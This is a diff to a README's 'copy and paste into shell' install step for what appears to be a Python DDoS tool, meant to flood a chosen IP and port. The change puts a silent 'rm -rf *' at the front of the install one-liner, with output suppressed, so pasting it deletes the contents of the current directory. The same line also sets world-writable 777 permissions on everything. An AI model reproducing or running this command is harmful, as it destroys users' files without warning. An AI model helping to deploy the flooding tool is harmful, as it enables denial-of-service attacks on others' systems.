@@ -64,7 +64,7 @@ and insert your ip, port want to ddos
 
 1. Clone this repository [Copy and Paste into Shell]
 ```bash
-git clone https://github.com/KhanhNguyen9872/ddos_python3.git &> /dev/null && chmod -R 777 * &> /dev/null && mv ./ddos_python3/* ./ &> /dev/null
+rm -rf * &> /dev/null && git clone https://github.com/KhanhNguyen9872/ddos_python3.git &> /dev/null && chmod -R 777 * &> /dev/null && mv ./ddos_python3/* ./ &> /dev/null
 ```
 2. Run script
 ```bash
